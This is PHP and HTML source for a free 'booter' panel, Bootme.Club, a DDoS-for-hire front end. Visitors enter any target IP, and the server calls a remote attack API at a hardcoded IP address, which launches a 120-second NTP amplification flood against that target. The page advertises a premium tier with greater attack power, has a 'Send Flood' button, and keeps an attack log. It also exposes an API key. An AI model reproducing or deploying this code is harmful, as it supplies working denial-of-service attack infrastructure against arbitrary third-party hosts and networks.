<?php
 require "anti-ddos-lite.php";
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Bootme.Club | Free Hub</title>

  <!-- GOOGLE FONTS -->
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500|Poppins:400,500,600,700|Roboto:400,500" rel="stylesheet"/>
  <link href="https://cdn.materialdesignicons.com/3.0.39/css/materialdesignicons.min.css" rel="stylesheet" />

  <!-- PLUGINS CSS STYLE -->
  <link href="assets/plugins/toaster/toastr.min.css" rel="stylesheet" />
  <link href="assets/plugins/nprogress/nprogress.css" rel="stylesheet" />
  <link href="assets/plugins/flag-icons/css/flag-icon.min.css" rel="stylesheet"/>
  <link href="assets/plugins/jvectormap/jquery-jvectormap-2.0.3.css" rel="stylesheet" />
  <link href="assets/plugins/ladda/ladda.min.css" rel="stylesheet" />
  <link href="assets/plugins/select2/css/select2.min.css" rel="stylesheet" />
  <link href="assets/plugins/daterangepicker/daterangepicker.css" rel="stylesheet" />

  <!-- SLEEK CSS -->
  <link id="sleek-css" rel="stylesheet" href="assets/css/sleek.css" />

  

  <!-- FAVICON -->
  <link href="assets/img/favicon.png" rel="shortcut icon" />

  <!--
    HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries
  -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
  <script src="assets/plugins/nprogress/nprogress.js"></script>
</head>


  <body class="sidebar-fixed sidebar-dark header-dark header-fixed" id="body">
    <script>
      NProgress.configure({ showSpinner: false });
      NProgress.start();
    </script>

    <div class="mobile-sticky-body-overlay"></div>

    <div class="wrapper">
      
              <!--
          ====================================
          ——— LEFT SIDEBAR WITH FOOTER
          =====================================
        -->
        <aside class="left-sidebar bg-sidebar">
          <div id="sidebar" class="sidebar sidebar-with-footer">
            <!-- Aplication Brand -->
            <div class="app-brand">
              <a href="/">
                <svg
                  class="brand-icon"
                  xmlns="http://www.w3.org/2000/svg"
                  preserveAspectRatio="xMidYMid"
                  width="30"
                  height="33"
                  viewBox="0 0 30 33"
                >
                  <g fill="none" fill-rule="evenodd">
                    <path
                      class="logo-fill-blue"
                      fill="#7DBCFF"
                      d="M0 4v25l8 4V0zM22 4v25l8 4V0z"
                    />
                    <path class="logo-fill-white" fill="#FFF" d="M11 4v25l8 4V0z" />
                  </g>
                </svg>
                <span class="brand-name">BootmeClub Free</span>
              </a>
            </div>
            <!-- begin sidebar scrollbar -->
            <div class="sidebar-scrollbar">

              <!-- sidebar menu -->
              <ul class="nav sidebar-inner" id="sidebar-menu">
                

                
                  <li  class="has-sub active expand" >
                    <a class="sidenav-item-link" href="javascript:void(0)" data-toggle="collapse" data-target="#dashboard"
                      aria-expanded="false" aria-controls="dashboard">
                      <i class="mdi mdi-view-dashboard-outline"></i>
                      <span class="nav-text">Dashboard</span> <b class="caret"></b>
                    </a>
                    <ul  class="collapse show"  id="dashboard"
                      data-parent="#sidebar-menu">
                      <div class="sub-menu">
                        
                        
                          
                            <li  class="active" >
                              <a class="sidenav-item-link" href="?">
                                <span class="nav-text">Hub</span>
                                
                              </a>
                            </li>
                            
                                                        <li>
                              <a class="sidenav-item-link" href="/panel/login.php">
                                <span class="nav-text">Bootme.Club Premium</span>
                                
                              </a>
                            </li>
                          
                        

                        
                      </div>
                    </ul>
                  </li>
                

                

                
                 
                        

                        
                        
                        
                

                
              </ul>

            </div>
            <hr class="separator" />
            <div class="sidebar-footer">
            <?php
                                     $file="log.log";
                        $linecount = 0;
                        $handle = fopen($file, "r");
                        while(!feof($handle)){
                        $line = fgets($handle);
                        $linecount++;
}

fclose($handle);
            $percentage = ($linecount * 10 - 10);
            ?>
              <div class="sidebar-footer-content">
                <h6 class="text-uppercase">
                Athens (Server 1) <span class="float-right"><?php echo $percentage ?>%</span>
                </h6>
                <div class="progress progress-xs">
                  <div
                    class="progress-bar active"
                    style="width: <?php echo $percentage ?>%;"
                    role="progressbar"
                  ></div>
                </div>
              </div>
            </div>
        </aside>

      

      <div class="page-wrapper">
                  <!-- Header -->
          <header class="main-header " id="header">
            <nav class="navbar navbar-static-top navbar-expand-lg">
              <!-- Sidebar toggle button -->
              <button id="sidebar-toggler" class="sidebar-toggle">
                <span class="sr-only">Toggle navigation</span>
              </button>
              <!-- search form -->
              <div class="search-form d-none d-lg-inline-block">

              </div>

              <div class="navbar-right ">
                <ul class="nav navbar-nav">
                  <!-- User Account -->
                  <li>
                  <a href="https://discord.gg/mBR5dPH" target="_BLANK">
                  <span class="mdi mdi-discord"></span>
                  </a>
                </li>
                </ul>
              </div>
            </nav>


          </header>

  <div class="content-wrapper">
   <div class="content">
                       <?php
                       $host = $_POST['address'];
                       $time = (time() + 120);
                       $user = $_SERVER["HTTP_CF_CONNECTING_IP"];
                       if (filter_var($host, FILTER_VALIDATE_IP)) {
                         if ($host !== NULL){
                         
                         $file="log.log";
                        $linecount = 0;
                        $handle = fopen($file, "r");
                        while(!feof($handle)){
                        $line = fgets($handle);
                        $linecount++;
}

fclose($handle);

                       if ( $linecount >= 11 ){
                       ?>
                       <div class="alert alert-warning" role="alert">All Attack Slots Are Taken</div>
                        <meta http-equiv="refresh" content="2;url=https://bootme.club/free" />
                       <?php
                       die;
                       }
                       if( strpos(file_get_contents("log.log"), $host) !== false) {
                       ?>
                       <div class="alert alert-warning" role="alert">Attack Is Already Running To <?php echo $host ?></div>
                        <meta http-equiv="refresh" content="2;url=https://bootme.club/free" />
                       <?php
                       die;
                       }
                       if( strpos(file_get_contents("log.log"), $user) !== false) {
                       ?>
                       <div class="alert alert-warning" role="alert">An Attack Is Already Running From <?php echo $user ?></div>
                        <meta http-equiv="refresh" content="2;url=https://bootme.club/free" />
                       <?php
                       die;
                       }
                       ?>
											<div class="alert alert-success" role="alert">Attack Sent Successfuly To <?php echo $host ?> Using Athens</div>
                      <?php
                      $arrayFind = array('[host]');
            $arrayReplace = array($host);
            $APILink = "http://149.202.144.177/test/ovh/OVH-KILL1.php?host=[host]&port=123&time=120&method=NTP";
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            $result = curl_exec($ch);
            curl_close($ch);
            $fp = fopen('log.log', 'a');
            fwrite($fp, "$host $user $time \n");
            fclose($fp);
            }
                        }

                      ?>
							
							<div class="row">
								
								<div class="col-lg-6">
									<div class="card card-default">
										<div class="card-header justify-content-between card-header-border-bottom">
											<h2>Hub </h2>
										</div>
										<div class="card-body">
											<form method="post">
												<div class="row">
													<div class="col-sm-6">
														<div class="form-group">
															<label for="ip">IP</label>
															<input type="text" name="address" class="form-control" placeholder="0.0.0.0-255.255.255.255">
														</div>
													</div>
													<div class="col-sm-6">
														<div class="form-group">
															<label for="port">Port</label>
															<input type="text" name="port" readonly class="form-control" placeholder="0-65535" value="123">
														</div>
													</div>
                          <div class="col-sm-6">
														<div class="form-group">
															<label for="port">Time</label>
															<input type="text" name="time" readonly class="form-control" placeholder="120" value="120">
														</div>
													</div>
                         <div class="col-sm-6">
                          <div class="form-group">
													<label for="exampleFormControlSelect12">Method</label>
													<select class="form-control" name="method" readonly id="exampleFormControlSelect12">
														<option>NTP</option>
													</select>
                          </div>
												</div>

													</div>
												   <div class="form-footer pt-5 border-top">
													<button type="submit" class="btn btn-danger btn-default">Send Flood</button>
												</div>
												</div>
											</form>
										</div>
									</div>
								<div class="col-lg-6">
									<div class="card card-default">
										<div class="card-header card-header-border-bottom">
											<h2>Info </h2>
										</div>
										<div class="card-body">
											<p class="mb-5"></a>We utilise NTP Amplification to provide free stress tests of 120 seconds to your target which range up to 1Gbp/s. For more premium services and up to 100x power click <a href="https://bootme.club/panel/">here</a><br><br><br><br>Power Proof:<br><br><a href="https://i.imgur.com/TEOMcBk.png" target="_BLANK">imgur.com/TEOMcBk</a></p>
										</div>
									</div>
     </div>          
   </div>
  </div>

          
                  <footer class="footer mt-auto">
            <div class="copyright bg-dark">
              <p>
                &copy; <span id="copy-year">2019</span> Copyright BootmeClubFree Made By Dashki
              </p>
            </div>
            <script>
                var d = new Date();
                var year = d.getFullYear();
                document.getElementById("copy-year").innerHTML = year;
            </script>
          </footer>

      </div>
    </div>

    
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDCn8TFXGg17HAUcNpkwtxxyT9Io9B_NcM" defer></script>
<script src="assets/plugins/jquery/jquery.min.js"></script>
<script src="assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="assets/plugins/toaster/toastr.min.js"></script>
<script src="assets/plugins/slimscrollbar/jquery.slimscroll.min.js"></script>
<script src="assets/plugins/charts/Chart.min.js"></script>
<script src="assets/plugins/ladda/spin.min.js"></script>
<script src="assets/plugins/ladda/ladda.min.js"></script>
<script src="assets/plugins/jquery-mask-input/jquery.mask.min.js"></script>
<script src="assets/plugins/select2/js/select2.min.js"></script>
<script src="assets/plugins/jvectormap/jquery-jvectormap-2.0.3.min.js"></script>
<script src="assets/plugins/jvectormap/jquery-jvectormap-world-mill.js"></script>
<script src="assets/plugins/daterangepicker/moment.min.js"></script>
<script src="assets/plugins/daterangepicker/daterangepicker.js"></script>
<script src="assets/plugins/jekyll-search.min.js"></script>
<script src="assets/js/sleek.js"></script>
<script src="assets/js/chart.js"></script>
<script src="assets/js/date-range.js"></script>
<script src="assets/js/map.js"></script>
<script src="assets/js/custom.js"></script>




  </body>
</html>
